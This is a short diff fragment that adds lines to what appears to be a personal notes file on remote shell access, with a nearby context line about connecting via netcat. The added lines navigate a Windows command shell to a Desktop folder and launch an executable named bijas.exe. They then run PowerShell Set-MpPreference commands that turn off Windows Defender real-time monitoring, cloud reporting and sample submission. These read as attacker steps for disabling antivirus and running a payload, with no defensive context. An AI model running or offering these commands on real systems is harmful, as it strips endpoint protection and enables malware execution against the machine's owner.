@@ -272,6 +272,26 @@ netcat [ here the link] [port]
 
 
 
+////for windows cmd execution
+ls
+cd ..
+ls
+cd Desktop
+ls
+cd exe_test
+ls
+start bijas.exe
+
+
+
+
+Set-MpPreference -DisableRealtimeMonitoring $true
+PowerShell Set-MpPreference -MAPSReporting 0
+Set-MpPreference -Force -DisableRealtimeMonitoring $true
+Set-MpPreference -SubmitSamplesConsent 0
+
+
+
 
 
 
